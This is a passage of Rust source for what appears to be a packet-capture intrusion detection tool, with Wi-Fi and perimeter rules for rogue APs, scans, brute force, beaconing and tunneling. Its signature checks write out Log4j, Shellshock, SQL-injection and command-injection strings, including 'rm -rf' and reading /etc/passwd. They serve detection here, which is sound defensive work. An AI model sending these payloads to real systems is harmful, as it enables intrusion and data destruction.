use std::collections::{HashMap, VecDeque};
use std::error::Error;
use std::io;
use std::sync::atomic::{AtomicBool, Ordering, AtomicUsize};
use std::sync::mpsc;
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant, SystemTime};

use chrono::{Local, TimeZone};
use crossterm::{
    event::{self, DisableMouseCapture, EnableMouseCapture, Event, KeyCode},
    execute,
    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
};
use etherparse::SlicedPacket;
use pcap::{Capture, Device};
use ratatui::{
    backend::CrosstermBackend,
    layout::{Constraint, Direction, Layout, Alignment, Rect},
    style::{Color, Modifier, Style},
    text::{Line, Span},
    widgets::{Block, Borders, Paragraph, Row, Table, TableState, Cell, List, ListItem, ListState},
    Terminal, Frame,
};
use serde::{Serialize, Deserialize};
use flate2::write::ZlibEncoder;
use flate2::Compression;
use std::io::Write;

const THREAT_SCENARIOS: &[(&str, &str, &str)] = &[
    ("Wi-Fi", "Rogue AP / evil twin", "Critical"),
    ("Wi-Fi", "AP impersonation / beacon mismatch", "Critical"),
    ("Wi-Fi", "Client joins rogue AP", "Critical"),
    ("Wi-Fi", "Same SSID, new BSSID with different security", "High"),
    ("Wi-Fi", "Authentication failures", "Medium"),
    ("Wi-Fi", "Deauth / disassoc flood", "Critical"),
    ("Wi-Fi", "Scan / recon burst", "Medium"),
    ("Wi-Fi", "DHCP spoof / client-ID mismatch", "High"),
    ("Wi-Fi", "Beaconing / C2-like periodic traffic", "High"),
    ("Wi-Fi", "DNS anomaly burst", "Medium"),
    ("Perimeter", "Malware signature / known IoC in payload", "Critical"),
    ("Perimeter", "Exploit attempt against exposed service", "Critical"),
    ("Perimeter", "SQLi / command injection signatures", "Critical"),
    ("Perimeter", "TCP SYN scan", "High"),
    ("Perimeter", "UDP scan", "High"),
    ("Perimeter", "ICMP sweep / ping sweep", "Medium"),
    ("Perimeter", "SSH brute force", "High"),
    ("Perimeter", "RDP brute force", "High"),
    ("Perimeter", "Web login brute force", "High"),
    ("Perimeter", "Port knocking / port probing", "Medium"),
    ("Perimeter", "Malware beaconing", "High"),
    ("Perimeter", "DNS tunneling / abuse", "High"),
    ("Perimeter", "DDoS flood", "Critical"),
    ("Perimeter", "Spoofed source / asymmetric replies", "High"),
    ("Perimeter", "Fragmentation abuse", "High"),
];

#[derive(Clone, Serialize, Deserialize)]
struct CapturedPacket {
    id: usize,
    time_str: String,
    timestamp_epoch_ms: u64,
    len: u32,
    src_mac: String,
    dst_mac: String,
    ether_type: String,
    src_ip: String,
    dst_ip: String,
    protocol: String,
    info: String,
    details: String,
    payload_hex: String,
    #[serde(skip)]
    raw_bytes: Vec<u8>,
}

#[derive(Clone)]
struct SecurityAlert {
    id: u64,
    time_str: String,
    layer: String,
    threat_type: String,
    severity: String,
    src: String,
    dst: String,
    details: String,
    rule_name: String,
    packets: Vec<CapturedPacket>,
}

#[derive(Clone)]
struct IdsmCompressedAlert {
    alert_id: u64,
    timestamp: String,
    threat_type: String,
    severity: String,
    source_entity: String,
    target_entity: String,
    rule_triggered: String,
    total_packets_involved: usize,
    raw_packets_size: usize,
    compressed_size: usize,
    compression_ratio: f32,
    compressed_payload: Vec<u8>,
    reconstructed_json: String,
}

#[derive(Serialize, Deserialize)]
struct CompressedAlertPayload {
    alert_id: u64,
    threat_type: String,
    severity: String,
    layer: String,
    rule_name: String,
    source: String,
    destination: String,
    details: String,
    start_time_epoch_ms: u64,
    packet_count: usize,
    packets: Vec<SemanticPacketSummary>,
}

#[derive(Serialize, Deserialize)]
struct SemanticPacketSummary {
    time_delta_ms: u32,
    len: u32,
    protocol: String,
    src_port: Option<u16>,
    dst_port: Option<u16>,
    info: String,
}

struct IDSM;

impl IDSM {
    fn compress(alert: &SecurityAlert) -> IdsmCompressedAlert {
        let start_time = alert.packets.first().map(|p| p.timestamp_epoch_ms).unwrap_or(0);
        let semantic_packets: Vec<SemanticPacketSummary> = alert.packets.iter().map(|p| {
            let (s_port, d_port) = parse_ports(&p.protocol, &p.info);
            SemanticPacketSummary {
                time_delta_ms: (p.timestamp_epoch_ms.saturating_sub(start_time)) as u32,
                len: p.len,
                protocol: p.protocol.clone(),
                src_port: s_port,
                dst_port: d_port,
                info: p.info.clone(),
            }
        }).collect();

        let payload = CompressedAlertPayload {
            alert_id: alert.id,
            threat_type: alert.threat_type.clone(),
            severity: alert.severity.clone(),
            layer: alert.layer.clone(),
            rule_name: alert.rule_name.clone(),
            source: alert.src.clone(),
            destination: alert.dst.clone(),
            details: alert.details.clone(),
            start_time_epoch_ms: start_time,
            packet_count: alert.packets.len(),
            packets: semantic_packets,
        };

        let serialized = serde_json::to_vec(&payload).unwrap_or_default();
        let raw_packets_total_size: usize = alert.packets.iter().map(|p| p.len as usize + 64).sum();
        
        let mut encoder = ZlibEncoder::new(Vec::new(), Compression::best());
        encoder.write_all(&serialized).unwrap();
        let compressed_bytes = encoder.finish().unwrap_or_default();
        let compressed_size = compressed_bytes.len();
        
        let compression_ratio = if raw_packets_total_size > 0 {
            (1.0 - (compressed_size as f32 / raw_packets_total_size as f32)) * 100.0
        } else {
            0.0
        };

        IdsmCompressedAlert {
            alert_id: alert.id,
            timestamp: alert.time_str.clone(),
            threat_type: alert.threat_type.clone(),
            severity: alert.severity.clone(),
            source_entity: alert.src.clone(),
            target_entity: alert.dst.clone(),
            rule_triggered: alert.rule_name.clone(),
            total_packets_involved: alert.packets.len(),
            raw_packets_size: raw_packets_total_size,
            compressed_size,
            compression_ratio,
            compressed_payload: compressed_bytes,
            reconstructed_json: serde_json::to_string_pretty(&payload).unwrap_or_default(),
        }
    }
}

fn parse_ports(_protocol: &str, info: &str) -> (Option<u16>, Option<u16>) {
    let mut src = None;
    let mut dst = None;
    if let Some(port_start) = info.find("Port ") {
        let parts: Vec<&str> = info[port_start + 5..].split_whitespace().collect();
        if parts.len() >= 3 && parts[1] == "->" {
            src = parts[0].parse().ok();
            let clean_dst: String = parts[2].chars().filter(|c| c.is_ascii_digit()).collect();
            dst = clean_dst.parse().ok();
        }
    }
    (src, dst)
}

struct SecurityAnalyzer {
    alert_id_counter: u64,
    known_ssid: String,
    authorized_bssid: String,
    rogue_ap_last_alerts: HashMap<String, Instant>,
    wifi_auth_failures: HashMap<String, Vec<Instant>>,
    wifi_deauths: HashMap<String, Vec<Instant>>,
    wifi_probes: HashMap<String, Vec<Instant>>,
    dhcp_mismatches: HashMap<String, Vec<Instant>>,
    tcp_syn_scans: HashMap<String, Vec<(u16, Instant)>>,
    udp_scans: HashMap<String, Vec<(u16, Instant)>>,
    icmp_sweeps: HashMap<String, Vec<(String, Instant)>>,
    brute_force_attempts: HashMap<String, Vec<(String, Instant)>>,
    port_knocks: HashMap<String, Vec<(u16, Instant)>>,
    dns_queries: HashMap<String, Vec<(String, Instant)>>,
    dns_nxdomains: HashMap<String, Vec<Instant>>,
    c2_beacons: HashMap<(String, String, u16), Vec<Instant>>,
    ddos_packets: HashMap<String, Vec<Instant>>,
    frag_abuse: HashMap<String, Vec<Instant>>,
    packet_history: VecDeque<CapturedPacket>,
}

impl SecurityAnalyzer {
    fn new() -> Self {
        SecurityAnalyzer {
            alert_id_counter: 0,
            known_ssid: "Enterprise_Secure".to_string(),
            authorized_bssid: "00:11:22:33:44:55".to_string(),
            rogue_ap_last_alerts: HashMap::new(),
            wifi_auth_failures: HashMap::new(),
            wifi_deauths: HashMap::new(),
            wifi_probes: HashMap::new(),
            dhcp_mismatches: HashMap::new(),
            tcp_syn_scans: HashMap::new(),
            udp_scans: HashMap::new(),
            icmp_sweeps: HashMap::new(),
            brute_force_attempts: HashMap::new(),
            port_knocks: HashMap::new(),
            dns_queries: HashMap::new(),
            dns_nxdomains: HashMap::new(),
            c2_beacons: HashMap::new(),
            ddos_packets: HashMap::new(),
            frag_abuse: HashMap::new(),
            packet_history: VecDeque::new(),
        }
    }

    fn clean_expired(&mut self, now: Instant) {
        let clean_window = |times: &mut Vec<Instant>, secs: u64| {
            times.retain(|t| now.duration_since(*t) < Duration::from_secs(secs));
        };
        self.wifi_auth_failures.values_mut().for_each(|t| clean_window(t, 60));
        self.wifi_deauths.values_mut().for_each(|t| clean_window(t, 30));
        self.wifi_probes.values_mut().for_each(|t| clean_window(t, 60));
        self.dhcp_mismatches.values_mut().for_each(|t| clean_window(t, 300));
        self.tcp_syn_scans.values_mut().for_each(|v| v.retain(|(_, t)| now.duration_since(*t) < Duration::from_secs(60)));
        self.udp_scans.values_mut().for_each(|v| v.retain(|(_, t)| now.duration_since(*t) < Duration::from_secs(60)));
        self.icmp_sweeps.values_mut().for_each(|v| v.retain(|(_, t)| now.duration_since(*t) < Duration::from_secs(60)));
        self.brute_force_attempts.values_mut().for_each(|v| v.retain(|(_, t)| now.duration_since(*t) < Duration::from_secs(60)));
        self.port_knocks.values_mut().for_each(|v| v.retain(|(_, t)| now.duration_since(*t) < Duration::from_secs(60)));
        self.dns_queries.values_mut().for_each(|v| v.retain(|(_, t)| now.duration_since(*t) < Duration::from_secs(60)));
        self.dns_nxdomains.values_mut().for_each(|t| clean_window(t, 60));
        self.ddos_packets.values_mut().for_each(|t| clean_window(t, 30));
        self.frag_abuse.values_mut().for_each(|t| clean_window(t, 60));
        for times in self.c2_beacons.values_mut() {
            if times.len() > 10 { times.remove(0); }
        }
    }

    fn analyze(&mut self, packet: &CapturedPacket) -> Vec<SecurityAlert> {
        let mut alerts = Vec::new();
        let now = Instant::now();
        self.packet_history.push_back(packet.clone());
        if self.packet_history.len() > 2000 { self.packet_history.pop_front(); }
        self.clean_expired(now);

        let p_info = &packet.info;
        let p_proto = &packet.protocol;

        let auth_bssid = self.authorized_bssid.clone();
        let known_ssid = self.known_ssid.clone();

        // --- Wi-Fi rules ---
        if p_proto.contains("Beacon") && p_info.contains(&format!("SSID={}", known_ssid)) {
            if let Some(b_idx) = p_info.find("BSSID=") {
                let bssid = p_info[b_idx + 6..b_idx + 23].to_string();
                if bssid != auth_bssid {
                    let should_alert = match self.rogue_ap_last_alerts.get(&bssid) {
                        Some(last) => now.duration_since(*last) > Duration::from_secs(120),
                        None => true,
                    };
                    if should_alert {
                        self.rogue_ap_last_alerts.insert(bssid.clone(), now);
                        alerts.push(self.create_alert("Wi-Fi", "Rogue AP / evil twin", "Critical", bssid.clone(), known_ssid.clone(),
                            format!("Detected Rogue AP with SSID '{}' operating on unauthorized BSSID '{}'.", known_ssid, bssid), "WiFi-01",
                            {
                                let b = bssid.clone();
                                move |p| p.protocol.contains("Beacon") && p.info.contains(&b)
                            }));
                    }
                }
            }
        }

        if p_proto.contains("Beacon") && p_info.contains(&format!("BSSID={}", auth_bssid)) {
            if p_info.contains("Sec=Open") || p_info.contains("Sec=WEP") {
                alerts.push(self.create_alert("Wi-Fi", "AP impersonation / beacon mismatch", "Critical", auth_bssid.clone(), known_ssid.clone(),
                    "AP Impersonation detected: Authorized BSSID but downgraded security settings.".to_string(), "WiFi-02",
                    {
                        let ab = auth_bssid.clone();
                        move |p| p.protocol.contains("Beacon") && p.info.contains(&ab) && (p.info.contains("Sec=Open") || p.info.contains("Sec=WEP"))
                    }));
            }
        }

        if p_proto.contains("Assoc Request") {
            if let Some(b_start) = p_info.find("BSSID=") {
                let bssid = p_info[b_start + 6..].trim().to_string();
                if !bssid.is_empty() && bssid != auth_bssid {
                    alerts.push(self.create_alert("Wi-Fi", "Client joins rogue AP", "Critical", packet.src_mac.clone(), bssid.clone(),
                        format!("Client '{}' associated with rogue AP BSSID '{}'.", packet.src_mac, bssid), "WiFi-03",
                        {
                            let b = bssid.clone();
                            let sm = packet.src_mac.clone();
                            move |p| p.protocol.contains("Assoc") && p.src_mac == sm && p.info.contains(&b)
                        }));
                }
            }
        }

        if p_proto.contains("Beacon") && p_info.contains(&format!("SSID={}", known_ssid)) {
            if let Some(b_idx) = p_info.find("BSSID=") {
                let bssid = p_info[b_idx + 6..b_idx + 23].to_string();
                if bssid != auth_bssid && (p_info.contains("Sec=Open") || p_info.contains("Sec=WEP") || p_info.contains("Sec=WPA2-PSK")) {
                    alerts.push(self.create_alert("Wi-Fi", "Same SSID, new BSSID with different security", "High", bssid.clone(), known_ssid.clone(),
                        format!("SSID '{}' seen on new BSSID '{}' with downgraded security.", known_ssid, bssid), "WiFi-04",
                        {
                            let b = bssid.clone();
                            move |p| p.protocol.contains("Beacon") && p.info.contains(&b)
                        }));
                }
            }
        }

        if p_proto.contains("802.11 Auth") && p_info.contains("Status=") && !p_info.contains("Status=0") {
            let client = packet.src_mac.clone();
            let mut trigger = false;
            {
                let list = self.wifi_auth_failures.entry(client.clone()).or_insert_with(Vec::new);
                list.push(now);
                if list.len() >= 5 {
                    list.clear();
                    trigger = true;
                }
            }
            if trigger {
                alerts.push(self.create_alert("Wi-Fi", "Authentication failures", "Medium", client.clone(), auth_bssid.clone(),
                    format!("Client '{}' failed authentication 5 times in 60s.", client), "WiFi-05",
                    {
                        let c = client.clone();
                        move |p| p.protocol.contains("Auth") && p.src_mac == c && p.info.contains("Status=") && !p.info.contains("Status=0")
                    }));
            }
        }

        if p_proto.contains("Deauth") || p_proto.contains("Disassoc") {
            let client = packet.dst_mac.clone();
            let mut trigger = false;
            {
                let list = self.wifi_deauths.entry(client.clone()).or_insert_with(Vec::new);
                list.push(now);
                if list.len() >= 10 {
                    list.clear();
                    trigger = true;
                }
            }
            if trigger {
                alerts.push(self.create_alert("Wi-Fi", "Deauth / disassoc flood", "Critical", packet.src_mac.clone(), client.clone(),
                    format!("Deauth flood targeting client '{}' (10+ frames in 30s).", client), "WiFi-06",
                    {
                        let c = client.clone();
                        move |p| (p.protocol.contains("Deauth") || p.protocol.contains("Disassoc")) && p.dst_mac == c
                    }));
            }
        }

        if p_proto.contains("802.11 Probe") {
            let client = packet.src_mac.clone();
            let mut trigger = false;
            {
                let list = self.wifi_probes.entry(client.clone()).or_insert_with(Vec::new);
                list.push(now);
                if list.len() >= 25 {
                    list.clear();
                    trigger = true;
                }
            }
            if trigger {
                alerts.push(self.create_alert("Wi-Fi", "Scan / recon burst", "Medium", client.clone(), "Broadcast".to_string(),
                    format!("Client '{}' sent 25+ Probe Requests (potential network scanning).", client), "WiFi-07",
                    {
                        let c = client.clone();
                        move |p| p.protocol.contains("Probe") && p.src_mac == c
                    }));
            }
        }

        if p_proto.contains("DHCP") {
            let client = packet.dst_mac.clone();
            let mut mismatch = false;
            let mut reason = "";
            if p_info.contains("OFFER") || p_info.contains("ACK") {
                if let Some(srv_idx) = p_info.find("Server=") {
                    let srv_ip = p_info[srv_idx + 7..].split_whitespace().next().unwrap_or("");
                    if !srv_ip.is_empty() && srv_ip != "192.168.1.1" && srv_ip != "Unknown" {
                        mismatch = true;
                        reason = "Unauthorized DHCP Server IP";
                    }
                }
                if let Some(ch_idx) = p_info.find("ClientMAC=") {
                    let ch_mac = p_info[ch_idx + 10..].split_whitespace().next().unwrap_or("");
                    if !ch_mac.is_empty() && ch_mac != packet.dst_mac && packet.dst_mac != "ff:ff:ff:ff:ff:ff" && ch_mac != "Unknown" {
                        mismatch = true;
                        reason = "DHCP Client-ID Header Mismatch";
                    }
                }
            }
            if mismatch {
                let mut trigger = false;
                {
                    let list = self.dhcp_mismatches.entry(client.clone()).or_insert_with(Vec::new);
                    list.push(now);
                    if list.len() >= 5 {
                        list.clear();
                        trigger = true;
                    }
                }
                if trigger {
                    alerts.push(self.create_alert("Wi-Fi", "DHCP spoof / client-ID mismatch", "High", packet.src_mac.clone(), client.clone(),
                        format!("DHCP spoofing detected (5 events): {}.", reason), "WiFi-08",
                        move |p| p.protocol.contains("DHCP") && p.info.contains("Server=")));
                }
            }
        }

        if p_proto.contains("802.11 Data") || p_proto.contains("TCP") || p_proto.contains("UDP") {
            let key = (packet.src_mac.clone(), packet.dst_mac.clone(), 0u16);
            let mut trigger = false;
            let mut interval = 0.0;
            {
                let times = self.c2_beacons.entry(key.clone()).or_insert_with(Vec::new);
                times.push(now);
                if times.len() >= 5 {
                    if let Some(inv) = detect_beaconing_intervals(times) {
                        times.clear();
                        trigger = true;
                        interval = inv;
                    }
                }
            }
            if trigger {
                alerts.push(self.create_alert("Wi-Fi", "Beaconing / C2-like periodic traffic", "High", key.0.clone(), key.1.clone(),
                    format!("Periodic traffic detected between '{}' and '{}' (~{:.1}s intervals).", key.0, key.1, interval), "WiFi-09",
                    {
                        let sm = packet.src_mac.clone();
                        let dm = packet.dst_mac.clone();
                        move |p| p.src_mac == sm && p.dst_mac == dm
                    }));
            }
        }

        if p_proto.contains("DNS") {
            let client = packet.src_ip.clone();
            let is_nx = p_info.contains("NXDOMAIN");
            let mut domain = String::new();
            if let Some(q_idx) = p_info.find("Query: ") {
                domain = p_info[q_idx + 7..].trim().to_string();
            } else if let Some(r_idx) = p_info.find("Response: ") {
                domain = p_info[r_idx + 10..].split_whitespace().next().unwrap_or("").to_string();
            }
            if !client.is_empty() && client != "Unknown" {
                let mut trigger = false;
                let mut unique_count = 0;
                let mut nx_count = 0;
                {
                    let queries = self.dns_queries.entry(client.clone()).or_insert_with(Vec::new);
                    if !domain.is_empty() { queries.push((domain.clone(), now)); }
                    let unique: std::collections::HashSet<String> = queries.iter().filter(|(_, t)| now.duration_since(*t) < Duration::from_secs(60)).map(|(d, _)| d.clone()).collect();
                    unique_count = unique.len();
                }
                {
                    let nx_list = self.dns_nxdomains.entry(client.clone()).or_insert_with(Vec::new);
                    if is_nx { nx_list.push(now); }
                    nx_count = nx_list.len();
                }
                if unique_count >= 25 || nx_count >= 25 {
                    self.dns_queries.entry(client.clone()).or_default().clear();
                    self.dns_nxdomains.entry(client.clone()).or_default().clear();
                    trigger = true;
                }
                if trigger {
                    alerts.push(self.create_alert("Wi-Fi", "DNS anomaly burst", "Medium", client.clone(), packet.dst_ip.clone(),
                        format!("DNS Anomaly burst: unique domain requests={}, NXDOMAIN responses={}.", unique_count, nx_count), "WiFi-10",
                        {
                            let c = client.clone();
                            move |p| p.protocol.contains("DNS") && p.src_ip == c
                        }));
                }
            }
        }

        // --- Perimeter rules ---
        if packet.details.contains("EICAR-STANDARD-ANTIVIRUS") || packet.details.contains("malware_shell_signature") {
            alerts.push(self.create_alert("Perimeter", "Malware signature / known IoC in payload", "Critical", packet.src_ip.clone(), packet.dst_ip.clone(),
                "Malware Signature Match: EICAR test string found in payload.".to_string(), "PERIM-01", |p| p.id == packet.id));
        }

        if packet.details.contains("${jndi:ldap://") || packet.details.contains("() { :;};") {
            alerts.push(self.create_alert("Perimeter", "Exploit attempt against exposed service", "Critical", packet.src_ip.clone(), packet.dst_ip.clone(),
                "Remote Code Execution Exploit signature matched (Log4j/Shellshock).".to_string(), "PERIM-02", |p| p.id == packet.id));
        }

        if packet.details.contains("admin' OR '1'='1") || packet.details.contains("; rm -rf") || packet.details.contains(";cat /etc/passwd") {
            alerts.push(self.create_alert("Perimeter", "SQLi / command injection signatures", "Critical", packet.src_ip.clone(), packet.dst_ip.clone(),
                "Database/System Injection attack strings identified in request payload.".to_string(), "PERIM-03", |p| p.id == packet.id));
        }

        if p_proto.contains("TCP") && p_info.contains("[SYN]") && !p_info.contains("ACK") {
            if let Some(port) = parse_port_from_info(p_info, true) {
                let list = self.tcp_syn_scans.entry(packet.src_ip.clone()).or_insert_with(Vec::new);
                list.push((port, now));
                let unique: std::collections::HashSet<u16> = list.iter().map(|(p, _)| *p).collect();
                if unique.len() >= 20 {
                    list.clear();
                    alerts.push(self.create_alert("Perimeter", "TCP SYN scan", "High", packet.src_ip.clone(), packet.dst_ip.clone(),
                        format!("TCP Port Scan: Source scanned {} unique ports.", unique.len()), "PERIM-04",
                        |p| p.protocol.contains("TCP") && p.src_ip == packet.src_ip && p.info.contains("[SYN]")));
                }
            }
        }

        if p_proto.contains("UDP") {
            if let Some(port) = parse_port_from_info(p_info, true) {
                let list = self.udp_scans.entry(packet.src_ip.clone()).or_insert_with(Vec::new);
                list.push((port, now));
                let unique: std::collections::HashSet<u16> = list.iter().map(|(p, _)| *p).collect();
                if unique.len() >= 20 {
                    list.clear();
                    alerts.push(self.create_alert("Perimeter", "UDP scan", "High", packet.src_ip.clone(), packet.dst_ip.clone(),
                        format!("UDP Port Scan: Source probed {} unique ports.", unique.len()), "PERIM-05",
                        |p| p.protocol.contains("UDP") && p.src_ip == packet.src_ip));
                }
            }
        }

        if p_proto.contains("ICMP") && p_info.contains("EchoRequest") {
            let list = self.icmp_sweeps.entry(packet.src_ip.clone()).or_insert_with(Vec::new);
            list.push((packet.dst_ip.clone(), now));
            let unique: std::collections::HashSet<String> = list.iter().map(|(h, _)| h.clone()).collect();
            if unique.len() >= 20 {
                list.clear();
                alerts.push(self.create_alert("Perimeter", "ICMP sweep / ping sweep", "Medium", packet.src_ip.clone(), "Subnet".to_string(),
                    format!("ICMP Ping Sweep: Host scanned {} subnet addresses.", unique.len()), "PERIM-06",
                    |p| p.protocol.contains("ICMP") && p.src_ip == packet.src_ip && p.info.contains("EchoRequest")));
            }
        }

        if p_proto.contains("TCP") {
            let src = packet.src_ip.clone();
            let d_port = parse_port_from_info(p_info, true).unwrap_or(0);
            let mut brute = false;
            let mut svc = "";
            let mut r_id = "";
            let mut threat = "";
            
            if d_port == 22 && (packet.details.contains("Failed password") || p_info.contains("RST")) {
                brute = true; svc = "SSH"; threat = "SSH brute force"; r_id = "PERIM-07";
            } else if d_port == 3389 && (p_info.contains("RST") || packet.details.contains("Failed")) {
                brute = true; svc = "RDP"; threat = "RDP brute force"; r_id = "PERIM-08";
            } else if (d_port == 80 || d_port == 443 || d_port == 8080) && (p_info.contains("401") || packet.details.contains("Login failed")) {
                brute = true; svc = "HTTP"; threat = "Web login brute force"; r_id = "PERIM-09";
            }
            
            if brute {
                let attempts = self.brute_force_attempts.entry(src.clone()).or_insert_with(Vec::new);
                attempts.push((svc.to_string(), now));
                let count = attempts.iter().filter(|(s, _)| s == svc).count();
                if count >= 5 {
                    attempts.retain(|(s, _)| s != svc);
                    alerts.push(self.create_alert("Perimeter", threat, "High", src.clone(), packet.dst_ip.clone(),
                        format!("Brute Force: 5 failed {} login attempts in 60s.", svc), r_id,
                        move |p| p.src_ip == src && parse_port_from_info(&p.info, true).unwrap_or(0) == d_port));
                }
            }
        }

        if p_proto.contains("TCP") && p_info.contains("[SYN]") && !p_info.contains("ACK") {
            if let Some(port) = parse_port_from_info(p_info, true) {
                let src = packet.src_ip.clone();
                let list = self.port_knocks.entry(src.clone()).or_insert_with(Vec::new);
                list.push((port, now));
                let unique: std::collections::HashSet<u16> = list.iter().map(|(p, _)| *p).collect();
                if unique.len() >= 10 {
                    list.clear();
                    alerts.push(self.create_alert("Perimeter", "Port knocking / port probing", "Medium", src.clone(), packet.dst_ip.clone(),
                        format!("Port Knocking sequence: 10+ port hits from '{}'.", src), "PERIM-10",
                        |p| p.src_ip == src && p.protocol.contains("TCP")));
                }
            }
        }

        if (p_proto.contains("TCP") || p_proto.contains("UDP")) && !packet.dst_ip.starts_with("192.168.") && packet.dst_ip != "255.255.255.255" {
            let port = parse_port_from_info(p_info, true).unwrap_or(0);
            let key = (packet.src_ip.clone(), packet.dst_ip.clone(), port);
            let times = self.c2_beacons.entry(key.clone()).or_insert_with(Vec::new);
            times.push(now);
            if times.len() >= 5 {
                if let Some(interval) = detect_beaconing_intervals(times) {
                    times.clear();
                    alerts.push(self.create_alert("Perimeter", "Malware beaconing", "High", key.0.clone(), format!("{}:{}", key.1, key.2),
                        format!("Periodic outbound connections to C2 server every ~{:.1}s.", interval), "PERIM-11",
                        |p| p.src_ip == packet.src_ip && p.dst_ip == packet.dst_ip));
                }
            }
        }

        if p_proto.contains("DNS") && p_info.contains("Query:") {
            if let Some(q_idx) = p_info.find("Query: ") {
                let domain = p_info[q_idx + 7..].trim();
                let label_len = domain.find('.').unwrap_or(domain.len());
                if label_len > 25 || domain.contains("tunnel") {
                    let client = packet.src_ip.clone();
                    let queries = self.dns_queries.entry(client.clone()).or_insert_with(Vec::new);
                    queries.push((domain.to_string(), now));
                    if queries.len() >= 25 {
                        queries.clear();
                        alerts.push(self.create_alert("Perimeter", "DNS tunneling / abuse", "High", client.clone(), packet.dst_ip.clone(),
                            "DNS Tunneling: anomalous query volume containing high entropy labels.".to_string(), "PERIM-12",
                            |p| p.protocol.contains("DNS") && p.src_ip == client));
                    }
                }
            }
        }

        if !packet.dst_ip.is_empty() && packet.dst_ip != "Unknown" {
            let dst = packet.dst_ip.clone();
            let list = self.ddos_packets.entry(dst.clone()).or_insert_with(Vec::new);
            list.push(now);
            if list.len() >= 100 {
                list.clear();
                alerts.push(self.create_alert("Perimeter", "DDoS flood", "Critical", "Multiple Sources".to_string(), dst.clone(),
                    "DDoS Traffic Flood: High packet frequency (100+ frames) targeting destination.".to_string(), "PERIM-13",
                    |p| p.dst_ip == dst));
            }
        }

        if p_proto.contains("TCP") && p_info.contains("ACK") && !p_info.contains("SYN") {
            if packet.details.contains("Spontaneous ACK") || packet.details.contains("Asymmetric reply") {
                alerts.push(self.create_alert("Perimeter", "Spoofed source / asymmetric replies", "High", packet.src_ip.clone(), packet.dst_ip.clone(),
                    "Asymmetric Reply: Unsolicited TCP ACK frame without handshake session context.".to_string(), "PERIM-14", |p| p.id == packet.id));
            }
        }

        if p_proto.contains("Frag") || packet.details.contains("overlapping fragments") {
            let src = packet.src_ip.clone();
            let list = self.frag_abuse.entry(src.clone()).or_insert_with(Vec::new);
            list.push(now);
            if list.len() >= 3 {
                list.clear();
                alerts.push(self.create_alert("Perimeter", "Fragmentation abuse", "High", src.clone(), packet.dst_ip.clone(),
                    "IP Fragmentation: Overlapping fragments or tiny segmented offsets detected.".to_string(), "PERIM-15",
                    |p| p.src_ip == src && (p.protocol.contains("Frag") || p.details.contains("fragments"))));
            }
        }

        alerts
    }

    fn create_alert<F>(&mut self, layer: &str, threat_type: &str, severity: &str, src: String, dst: String, details: String, rule_name: &str, filter_fn: F) -> SecurityAlert
    where F: Fn(&CapturedPacket) -> bool {
        self.alert_id_counter += 1;
        let dt = Local::now();
        let time_str = dt.format("%H:%M:%S%.6f").to_string();
        let filtered: Vec<CapturedPacket> = self.packet_history.iter().filter(|p| filter_fn(p)).cloned().collect();
        SecurityAlert {
            id: self.alert_id_counter,
            time_str,
            layer: layer.to_string(),
            threat_type: threat_type.to_string(),
            severity: severity.to_string(),
            src,
            dst,
            details,
            rule_name: rule_name.to_string(),
            packets: if filtered.is_empty() { vec![self.packet_history.back().unwrap().clone()] } else { filtered },
        }
    }
}

fn detect_beaconing_intervals(times: &[Instant]) -> Option<f64> {
    if times.len() < 4 { return None; }
    let mut intervals = Vec::new();
    for i in 0..times.len() - 1 {
        intervals.push(times[i+1].duration_since(times[i]).as_secs_f64());
    }
    let sum: f64 = intervals.iter().sum();
    let mean = sum / intervals.len() as f64;
    let variance: f64 = intervals.iter().map(|&x| (x - mean).powi(2)).sum::<f64>() / intervals.len() as f64;
    let std_dev = variance.sqrt();
    if std_dev < 0.15 * mean && mean > 0.05 { Some(mean) } else { None }
}

fn parse_port_from_info(info: &str, parse_dst: bool) -> Option<u16> {
    let (_, d_port) = parse_ports("", info);
    if parse_dst { d_port } else {
        if let Some(port_start) = info.find("Port ") {
            let parts: Vec<&str> = info[port_start + 5..].split_whitespace().collect();
            if !parts.is_empty() { parts[0].parse().ok() } else { None }
        } else { None }
    }
}

fn format_mac(mac: &[u8]) -> String {
    if mac.len() >= 6 {
        format!("{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5])
    } else {
        format!("{:02x?}", mac)
    }
}

fn format_ipv4_bytes(bytes: &[u8]) -> String {
    if bytes.len() >= 4 {
        format!("{}.{}.{}.{}", bytes[0], bytes[1], bytes[2], bytes[3])
    } else {
        format!("{:?}", bytes)
    }
}

fn guess_service(src_port: u16, dst_port: u16) -> &'static str {
    let check = |p| match p {
        80 | 8080 => Some("HTTP"),
        443 | 8443 => Some("HTTPS"),
        53 => Some("DNS"),
        22 => Some("SSH"),
        21 => Some("FTP"),
        23 => Some("Telnet"),
        25 => Some("SMTP"),
        110 => Some("POP3"),
        143 => Some("IMAP"),
        123 => Some("NTP"),
        67 | 68 => Some("DHCP"),
        161 | 162 => Some("SNMP"),
        5353 => Some("mDNS"),
        3389 => Some("RDP"),
        _ => None,
    };
    check(dst_port).or_else(|| check(src_port)).unwrap_or("")
}

fn format_hex_dump(data: &[u8]) -> String {
    if data.is_empty() { return "No payload data present.".to_string(); }
    let mut dump = String::new();
    for (i, chunk) in data.chunks(16).enumerate() {
        let offset = i * 16;
        dump.push_str(&format!("{:04x}  ", offset));
        for j in 0..16 {
            if j < chunk.len() { dump.push_str(&format!("{:02x} ", chunk[j])); }
            else { dump.push_str("   "); }
            if j == 7 { dump.push_str(" "); }
        }
        dump.push_str(" |");
        for &b in chunk {
            if b >= 32 && b <= 126 { dump.push(b as char); }
            else { dump.push('.'); }
        }
        dump.push_str("|\n");
    }
    dump
}

fn parse_80211(data: &[u8]) -> Option<(String, String, String, String, String)> {
    if data.len() < 24 { return None; }
    let fc0 = data[0];
    let fc1 = data[1];
    let frame_type = (fc0 >> 2) & 0x03;
    let frame_subtype = (fc0 >> 4) & 0x0f;

    let (type_str, subtype_str) = match (frame_type, frame_subtype) {
        (0, 0) => ("Mgmt", "Assoc Request"),
        (0, 1) => ("Mgmt", "Assoc Response"),
        (0, 4) => ("Mgmt", "Probe Request"),
        (0, 5) => ("Mgmt", "Probe Response"),
        (0, 8) => ("Mgmt", "Beacon"),
        (0, 10) => ("Mgmt", "Disassociation"),
        (0, 11) => ("Mgmt", "Authentication"),
        (0, 12) => ("Mgmt", "Deauthentication"),
        (2, 0) => ("Data", "Data"),
